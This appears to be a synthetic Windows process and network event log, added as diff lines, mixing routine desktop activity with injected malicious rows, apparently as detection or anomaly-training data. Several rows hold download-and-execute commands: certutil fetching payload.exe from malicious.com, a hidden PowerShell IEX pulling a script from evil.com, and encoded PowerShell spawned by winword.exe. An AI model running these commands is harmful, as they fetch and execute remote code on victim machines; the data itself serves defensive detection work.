+2026-03-30 18:12:26,cmd.exe,explorer.exe,cmd dir,192.168.1.240,0,chrome
+2026-03-30 18:12:27,notepad.exe,explorer.exe,cmd dir,192.168.1.226,0,chrome
+2026-03-30 18:12:28,notepad.exe,explorer.exe,cmd dir,192.168.1.79,0,chrome
+2026-03-30 18:12:29,chrome.exe,explorer.exe,explorer open folder,192.168.1.13,0,chrome
+2026-03-30 18:12:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
+2026-03-30 18:12:31,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.201,0,chrome
+2026-03-30 18:12:32,explorer.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
+2026-03-30 18:12:33,cmd.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
+2026-03-30 18:12:34,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.197,0,chrome
+2026-03-30 18:12:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.251,0,chrome
+2026-03-30 18:12:36,notepad.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
+2026-03-30 18:12:37,explorer.exe,explorer.exe,cmd dir,192.168.1.4,0,chrome
+2026-03-30 18:12:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
+2026-03-30 18:12:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.46,0,chrome
+2026-03-30 18:12:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.186,0,chrome
+2026-03-30 18:12:41,cmd.exe,explorer.exe,explorer open folder,192.168.1.42,0,chrome
+2026-03-30 18:12:42,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.255,0,chrome
+2026-03-30 18:12:43,chrome.exe,explorer.exe,explorer open folder,192.168.1.110,0,chrome
+2026-03-30 18:12:44,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.89,0,chrome
+2026-03-30 18:12:45,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
+2026-03-30 18:12:46,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,443,curl
+2026-03-30 18:12:47,powershell.exe,winword.exe,powershell -enc aW52b2tl,23.45.67.89,443,curl
+2026-03-30 18:12:48,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,curl
+2026-03-30 18:12:49,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,4444,python-requests
+2026-03-30 18:12:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,winhttp
+2026-03-30 18:12:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
+2026-03-30 18:12:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:12:53,notepad.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
+2026-03-30 18:12:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
+2026-03-30 18:12:55,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
+2026-03-30 18:12:56,cmd.exe,explorer.exe,explorer open folder,192.168.1.209,0,chrome
+2026-03-30 18:12:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
+2026-03-30 18:12:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.120,0,chrome
+2026-03-30 18:12:59,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.135,0,chrome
+2026-03-30 18:13:00,cmd.exe,explorer.exe,cmd dir,192.168.1.155,0,chrome
+2026-03-30 18:13:01,explorer.exe,explorer.exe,cmd dir,192.168.1.201,0,chrome
+2026-03-30 18:13:02,chrome.exe,explorer.exe,cmd dir,192.168.1.62,0,chrome
+2026-03-30 18:13:03,chrome.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
+2026-03-30 18:13:04,explorer.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
+2026-03-30 18:13:05,explorer.exe,explorer.exe,cmd dir,192.168.1.175,0,chrome
+2026-03-30 18:13:06,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.4,0,chrome
+2026-03-30 18:13:07,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.57,0,chrome
+2026-03-30 18:13:08,explorer.exe,explorer.exe,cmd dir,192.168.1.100,0,chrome
+2026-03-30 18:13:09,notepad.exe,explorer.exe,cmd dir,192.168.1.142,0,chrome
+2026-03-30 18:13:10,notepad.exe,explorer.exe,notepad file.txt,192.168.1.30,0,chrome
+2026-03-30 18:13:11,explorer.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
+2026-03-30 18:13:12,chrome.exe,explorer.exe,notepad file.txt,192.168.1.86,0,chrome
+2026-03-30 18:13:13,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
+2026-03-30 18:13:14,notepad.exe,explorer.exe,cmd dir,192.168.1.76,0,chrome
+2026-03-30 18:13:15,chrome.exe,explorer.exe,explorer open folder,192.168.1.169,0,chrome
+2026-03-30 18:13:16,notepad.exe,explorer.exe,cmd dir,192.168.1.95,0,chrome
+2026-03-30 18:13:17,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.125,0,chrome
+2026-03-30 18:13:18,chrome.exe,explorer.exe,notepad file.txt,192.168.1.137,0,chrome
+2026-03-30 18:13:19,cmd.exe,explorer.exe,notepad file.txt,192.168.1.32,0,chrome
+2026-03-30 18:13:20,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.244,0,chrome
+2026-03-30 18:13:21,notepad.exe,explorer.exe,cmd dir,192.168.1.113,0,chrome
+2026-03-30 18:13:22,explorer.exe,explorer.exe,explorer open folder,192.168.1.122,0,chrome
+2026-03-30 18:13:23,explorer.exe,explorer.exe,explorer open folder,192.168.1.128,0,chrome
+2026-03-30 18:13:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.144,0,chrome
+2026-03-30 18:13:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.223,0,chrome
+2026-03-30 18:13:26,chrome.exe,explorer.exe,cmd dir,192.168.1.152,0,chrome
+2026-03-30 18:13:27,chrome.exe,explorer.exe,cmd dir,192.168.1.144,0,chrome
+2026-03-30 18:13:28,cmd.exe,explorer.exe,explorer open folder,192.168.1.150,0,chrome
+2026-03-30 18:13:29,cmd.exe,explorer.exe,explorer open folder,192.168.1.175,0,chrome
+2026-03-30 18:13:30,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
+2026-03-30 18:13:31,notepad.exe,explorer.exe,notepad file.txt,192.168.1.29,0,chrome
+2026-03-30 18:13:32,chrome.exe,explorer.exe,notepad file.txt,192.168.1.110,0,chrome
+2026-03-30 18:13:33,explorer.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
+2026-03-30 18:13:34,cmd.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
+2026-03-30 18:13:35,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.74,0,chrome
+2026-03-30 18:13:36,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.28,0,chrome
+2026-03-30 18:13:37,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
+2026-03-30 18:13:38,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
+2026-03-30 18:13:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
+2026-03-30 18:13:40,chrome.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
+2026-03-30 18:13:41,chrome.exe,explorer.exe,cmd dir,192.168.1.233,0,chrome
+2026-03-30 18:13:42,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.167,0,chrome
+2026-03-30 18:13:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.86,0,chrome
+2026-03-30 18:13:44,cmd.exe,explorer.exe,explorer open folder,192.168.1.215,0,chrome
+2026-03-30 18:13:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
+2026-03-30 18:13:46,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.99,0,chrome
+2026-03-30 18:13:47,chrome.exe,explorer.exe,notepad file.txt,192.168.1.61,0,chrome
+2026-03-30 18:13:48,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.85,0,chrome
+2026-03-30 18:13:49,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.245,0,chrome
+2026-03-30 18:13:50,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.115,0,chrome
+2026-03-30 18:13:51,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.139,0,chrome
+2026-03-30 18:13:52,notepad.exe,explorer.exe,notepad file.txt,192.168.1.63,0,chrome
+2026-03-30 18:13:53,chrome.exe,explorer.exe,cmd dir,192.168.1.121,0,chrome
+2026-03-30 18:13:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.44,0,chrome
+2026-03-30 18:13:55,cmd.exe,explorer.exe,cmd dir,192.168.1.111,0,chrome
+2026-03-30 18:13:56,cmd.exe,explorer.exe,cmd dir,192.168.1.228,0,chrome
+2026-03-30 18:13:57,chrome.exe,explorer.exe,cmd dir,192.168.1.37,0,chrome
+2026-03-30 18:13:58,explorer.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
+2026-03-30 18:13:59,cmd.exe,explorer.exe,explorer open folder,192.168.1.2,0,chrome
+2026-03-30 18:14:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
+2026-03-30 18:14:01,chrome.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
+2026-03-30 18:14:02,cmd.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
+2026-03-30 18:14:03,cmd.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
+2026-03-30 18:14:04,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.98,0,chrome
+2026-03-30 18:14:05,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.67,0,chrome
+2026-03-30 18:14:06,explorer.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
+2026-03-30 18:14:07,chrome.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
+2026-03-30 18:14:08,chrome.exe,explorer.exe,notepad file.txt,192.168.1.42,0,chrome
+2026-03-30 18:14:09,explorer.exe,explorer.exe,explorer open folder,192.168.1.104,0,chrome
+2026-03-30 18:14:10,chrome.exe,explorer.exe,explorer open folder,192.168.1.106,0,chrome
+2026-03-30 18:14:11,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.73,0,chrome
+2026-03-30 18:14:12,notepad.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
+2026-03-30 18:14:13,notepad.exe,explorer.exe,cmd dir,192.168.1.24,0,chrome
+2026-03-30 18:14:14,notepad.exe,explorer.exe,cmd dir,192.168.1.57,0,chrome
+2026-03-30 18:14:15,chrome.exe,explorer.exe,cmd dir,192.168.1.107,0,chrome
+2026-03-30 18:14:16,chrome.exe,explorer.exe,explorer open folder,192.168.1.137,0,chrome
+2026-03-30 18:14:17,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.212,0,chrome
+2026-03-30 18:14:18,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
+2026-03-30 18:14:19,explorer.exe,explorer.exe,explorer open folder,192.168.1.212,0,chrome
+2026-03-30 18:14:20,explorer.exe,explorer.exe,notepad file.txt,192.168.1.165,0,chrome
+2026-03-30 18:14:21,notepad.exe,explorer.exe,cmd dir,192.168.1.16,0,chrome
+2026-03-30 18:14:22,cmd.exe,explorer.exe,cmd dir,192.168.1.88,0,chrome
+2026-03-30 18:14:23,cmd.exe,explorer.exe,cmd dir,192.168.1.131,0,chrome
+2026-03-30 18:14:24,chrome.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
+2026-03-30 18:14:25,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,curl
+2026-03-30 18:14:26,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,curl
+2026-03-30 18:14:27,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),1.1.1.1,80,python-requests
+2026-03-30 18:14:28,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,python-requests
+2026-03-30 18:14:29,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
+2026-03-30 18:14:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:14:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:14:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,winhttp
+2026-03-30 18:14:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.15,0,chrome
+2026-03-30 18:14:34,chrome.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
+2026-03-30 18:14:35,chrome.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
+2026-03-30 18:14:36,cmd.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
+2026-03-30 18:14:37,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.15,0,chrome
+2026-03-30 18:14:38,explorer.exe,explorer.exe,explorer open folder,192.168.1.185,0,chrome
+2026-03-30 18:14:39,notepad.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
+2026-03-30 18:14:40,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.29,0,chrome
+2026-03-30 18:14:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.204,0,chrome
+2026-03-30 18:14:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.124,0,chrome
+2026-03-30 18:14:43,explorer.exe,explorer.exe,cmd dir,192.168.1.167,0,chrome
+2026-03-30 18:14:44,explorer.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
+2026-03-30 18:14:45,cmd.exe,explorer.exe,cmd dir,192.168.1.30,0,chrome
+2026-03-30 18:14:46,notepad.exe,explorer.exe,explorer open folder,192.168.1.101,0,chrome
+2026-03-30 18:14:47,explorer.exe,explorer.exe,explorer open folder,192.168.1.200,0,chrome
+2026-03-30 18:14:48,cmd.exe,explorer.exe,explorer open folder,192.168.1.74,0,chrome
+2026-03-30 18:14:49,explorer.exe,explorer.exe,cmd dir,192.168.1.124,0,chrome
+2026-03-30 18:14:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.54,0,chrome
+2026-03-30 18:14:51,explorer.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
+2026-03-30 18:14:52,notepad.exe,explorer.exe,cmd dir,192.168.1.133,0,chrome
+2026-03-30 18:14:53,cmd.exe,explorer.exe,explorer open folder,192.168.1.17,0,chrome
+2026-03-30 18:14:54,chrome.exe,explorer.exe,explorer open folder,192.168.1.99,0,chrome
+2026-03-30 18:14:55,cmd.exe,explorer.exe,notepad file.txt,192.168.1.158,0,chrome
+2026-03-30 18:14:56,chrome.exe,explorer.exe,cmd dir,192.168.1.131,0,chrome
+2026-03-30 18:14:57,notepad.exe,explorer.exe,cmd dir,192.168.1.110,0,chrome
+2026-03-30 18:14:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.123,0,chrome
+2026-03-30 18:14:59,explorer.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
+2026-03-30 18:15:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.200,0,chrome
+2026-03-30 18:15:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.100,0,chrome
+2026-03-30 18:15:02,notepad.exe,explorer.exe,explorer open folder,192.168.1.167,0,chrome
+2026-03-30 18:15:03,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.44,0,chrome
+2026-03-30 18:15:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.248,0,chrome
+2026-03-30 18:15:05,chrome.exe,explorer.exe,notepad file.txt,192.168.1.103,0,chrome
+2026-03-30 18:15:06,notepad.exe,explorer.exe,cmd dir,192.168.1.111,0,chrome
+2026-03-30 18:15:07,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.196,0,chrome
+2026-03-30 18:15:08,explorer.exe,explorer.exe,explorer open folder,192.168.1.114,0,chrome
+2026-03-30 18:15:09,cmd.exe,explorer.exe,cmd dir,192.168.1.151,0,chrome
+2026-03-30 18:15:10,cmd.exe,explorer.exe,cmd dir,192.168.1.153,0,chrome
+2026-03-30 18:15:11,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.112,0,chrome
+2026-03-30 18:15:12,explorer.exe,explorer.exe,explorer open folder,192.168.1.14,0,chrome
+2026-03-30 18:15:13,chrome.exe,explorer.exe,explorer open folder,192.168.1.140,0,chrome
+2026-03-30 18:15:14,explorer.exe,explorer.exe,notepad file.txt,192.168.1.192,0,chrome
+2026-03-30 18:15:15,unknown_330.exe,cmd.exe,random suspicious execution,1.1.1.1,9999,unknown
+2026-03-30 18:15:16,chrome.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
+2026-03-30 18:15:17,chrome.exe,explorer.exe,explorer open folder,192.168.1.25,0,chrome
+2026-03-30 18:15:18,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.133,0,chrome
+2026-03-30 18:15:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
+2026-03-30 18:15:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.223,0,chrome
+2026-03-30 18:15:21,cmd.exe,explorer.exe,explorer open folder,192.168.1.210,0,chrome
+2026-03-30 18:15:22,explorer.exe,explorer.exe,cmd dir,192.168.1.26,0,chrome
+2026-03-30 18:15:23,cmd.exe,explorer.exe,explorer open folder,192.168.1.252,0,chrome
+2026-03-30 18:15:24,cmd.exe,explorer.exe,explorer open folder,192.168.1.26,0,chrome
+2026-03-30 18:15:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.69,0,chrome
+2026-03-30 18:15:26,notepad.exe,explorer.exe,explorer open folder,192.168.1.87,0,chrome
+2026-03-30 18:15:27,explorer.exe,explorer.exe,notepad file.txt,192.168.1.174,0,chrome
+2026-03-30 18:15:28,explorer.exe,explorer.exe,cmd dir,192.168.1.185,0,chrome
+2026-03-30 18:15:29,cmd.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
+2026-03-30 18:15:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
+2026-03-30 18:15:31,chrome.exe,explorer.exe,notepad file.txt,192.168.1.109,0,chrome
+2026-03-30 18:15:32,cmd.exe,explorer.exe,notepad file.txt,192.168.1.166,0,chrome
+2026-03-30 18:15:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.111,0,chrome
+2026-03-30 18:15:34,explorer.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
+2026-03-30 18:15:35,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.191,0,chrome
+2026-03-30 18:15:36,cmd.exe,explorer.exe,explorer open folder,192.168.1.19,0,chrome
+2026-03-30 18:15:37,chrome.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
+2026-03-30 18:15:38,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
+2026-03-30 18:15:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.13,0,chrome
+2026-03-30 18:15:40,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
+2026-03-30 18:15:41,chrome.exe,explorer.exe,notepad file.txt,192.168.1.13,0,chrome
+2026-03-30 18:15:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.51,0,chrome
+2026-03-30 18:15:43,chrome.exe,explorer.exe,notepad file.txt,192.168.1.141,0,chrome
+2026-03-30 18:15:44,chrome.exe,explorer.exe,notepad file.txt,192.168.1.126,0,chrome
+2026-03-30 18:15:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
+2026-03-30 18:15:46,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
+2026-03-30 18:15:47,notepad.exe,explorer.exe,explorer open folder,192.168.1.237,0,chrome
+2026-03-30 18:15:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.223,0,chrome
+2026-03-30 18:15:49,explorer.exe,explorer.exe,cmd dir,192.168.1.142,0,chrome
+2026-03-30 18:15:50,explorer.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
+2026-03-30 18:15:51,cmd.exe,explorer.exe,cmd dir,192.168.1.227,0,chrome
+2026-03-30 18:15:52,explorer.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
+2026-03-30 18:15:53,chrome.exe,explorer.exe,cmd dir,192.168.1.135,0,chrome
+2026-03-30 18:15:54,cmd.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
+2026-03-30 18:15:55,notepad.exe,explorer.exe,notepad file.txt,192.168.1.70,0,chrome
+2026-03-30 18:15:56,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.127,0,chrome
+2026-03-30 18:15:57,chrome.exe,explorer.exe,notepad file.txt,192.168.1.26,0,chrome
+2026-03-30 18:15:58,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
+2026-03-30 18:15:59,cmd.exe,explorer.exe,cmd dir,192.168.1.96,0,chrome
+2026-03-30 18:16:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.213,0,chrome
+2026-03-30 18:16:01,notepad.exe,explorer.exe,explorer open folder,192.168.1.148,0,chrome
+2026-03-30 18:16:02,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.95,0,chrome
+2026-03-30 18:16:03,explorer.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
+2026-03-30 18:16:04,explorer.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
+2026-03-30 18:16:05,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
+2026-03-30 18:16:06,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,python-requests
+2026-03-30 18:16:07,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,python-requests
+2026-03-30 18:16:08,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),1.1.1.1,80,python-requests
+2026-03-30 18:16:09,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,4444,curl
+2026-03-30 18:16:10,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,winhttp
+2026-03-30 18:16:11,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:16:12,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
+2026-03-30 18:16:13,notepad.exe,explorer.exe,explorer open folder,192.168.1.148,0,chrome
+2026-03-30 18:16:14,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.74,0,chrome
+2026-03-30 18:16:15,notepad.exe,explorer.exe,cmd dir,192.168.1.140,0,chrome
+2026-03-30 18:16:16,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.208,0,chrome
+2026-03-30 18:16:17,cmd.exe,explorer.exe,explorer open folder,192.168.1.188,0,chrome
+2026-03-30 18:16:18,explorer.exe,explorer.exe,notepad file.txt,192.168.1.135,0,chrome
+2026-03-30 18:16:19,cmd.exe,explorer.exe,notepad file.txt,192.168.1.33,0,chrome
+2026-03-30 18:16:20,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.218,0,chrome
+2026-03-30 18:16:21,chrome.exe,explorer.exe,notepad file.txt,192.168.1.29,0,chrome
+2026-03-30 18:16:22,cmd.exe,explorer.exe,cmd dir,192.168.1.217,0,chrome
+2026-03-30 18:16:23,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.182,0,chrome
+2026-03-30 18:16:24,explorer.exe,explorer.exe,cmd dir,192.168.1.149,0,chrome
+2026-03-30 18:16:25,explorer.exe,explorer.exe,cmd dir,192.168.1.189,0,chrome
+2026-03-30 18:16:26,notepad.exe,explorer.exe,explorer open folder,192.168.1.66,0,chrome
+2026-03-30 18:16:27,chrome.exe,explorer.exe,explorer open folder,192.168.1.27,0,chrome
+2026-03-30 18:16:28,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.179,0,chrome
+2026-03-30 18:16:29,cmd.exe,explorer.exe,explorer open folder,192.168.1.95,0,chrome
+2026-03-30 18:16:30,explorer.exe,explorer.exe,notepad file.txt,192.168.1.51,0,chrome
+2026-03-30 18:16:31,cmd.exe,explorer.exe,notepad file.txt,192.168.1.87,0,chrome
+2026-03-30 18:16:32,chrome.exe,explorer.exe,notepad file.txt,192.168.1.58,0,chrome
+2026-03-30 18:16:33,notepad.exe,explorer.exe,notepad file.txt,192.168.1.99,0,chrome
+2026-03-30 18:16:34,chrome.exe,explorer.exe,notepad file.txt,192.168.1.137,0,chrome
+2026-03-30 18:16:35,notepad.exe,explorer.exe,notepad file.txt,192.168.1.212,0,chrome
+2026-03-30 18:16:36,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
+2026-03-30 18:16:37,cmd.exe,explorer.exe,cmd dir,192.168.1.229,0,chrome
+2026-03-30 18:16:38,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.30,0,chrome
+2026-03-30 18:16:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
+2026-03-30 18:16:40,explorer.exe,explorer.exe,cmd dir,192.168.1.194,0,chrome
+2026-03-30 18:16:41,cmd.exe,explorer.exe,cmd dir,192.168.1.143,0,chrome
+2026-03-30 18:16:42,notepad.exe,explorer.exe,cmd dir,192.168.1.238,0,chrome
+2026-03-30 18:16:43,cmd.exe,explorer.exe,explorer open folder,192.168.1.108,0,chrome
+2026-03-30 18:16:44,cmd.exe,explorer.exe,notepad file.txt,192.168.1.183,0,chrome
+2026-03-30 18:16:45,notepad.exe,explorer.exe,explorer open folder,192.168.1.151,0,chrome
+2026-03-30 18:16:46,chrome.exe,explorer.exe,notepad file.txt,192.168.1.147,0,chrome
+2026-03-30 18:16:47,chrome.exe,explorer.exe,explorer open folder,192.168.1.42,0,chrome
+2026-03-30 18:16:48,explorer.exe,explorer.exe,notepad file.txt,192.168.1.217,0,chrome
+2026-03-30 18:16:49,explorer.exe,explorer.exe,cmd dir,192.168.1.69,0,chrome
+2026-03-30 18:16:50,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.137,0,chrome
+2026-03-30 18:16:51,cmd.exe,explorer.exe,notepad file.txt,192.168.1.240,0,chrome
+2026-03-30 18:16:52,notepad.exe,explorer.exe,explorer open folder,192.168.1.220,0,chrome
+2026-03-30 18:16:53,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.131,0,chrome
+2026-03-30 18:16:54,chrome.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
+2026-03-30 18:16:55,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.255,0,chrome
+2026-03-30 18:16:56,explorer.exe,explorer.exe,explorer open folder,192.168.1.183,0,chrome
+2026-03-30 18:16:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.133,0,chrome
+2026-03-30 18:16:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.2,0,chrome
+2026-03-30 18:16:59,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.60,0,chrome
+2026-03-30 18:17:00,chrome.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
+2026-03-30 18:17:01,explorer.exe,explorer.exe,explorer open folder,192.168.1.165,0,chrome
+2026-03-30 18:17:02,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
+2026-03-30 18:17:03,notepad.exe,explorer.exe,explorer open folder,192.168.1.158,0,chrome
+2026-03-30 18:17:04,explorer.exe,explorer.exe,cmd dir,192.168.1.199,0,chrome
+2026-03-30 18:17:05,cmd.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
+2026-03-30 18:17:06,cmd.exe,explorer.exe,cmd dir,192.168.1.156,0,chrome
+2026-03-30 18:17:07,notepad.exe,explorer.exe,explorer open folder,192.168.1.166,0,chrome
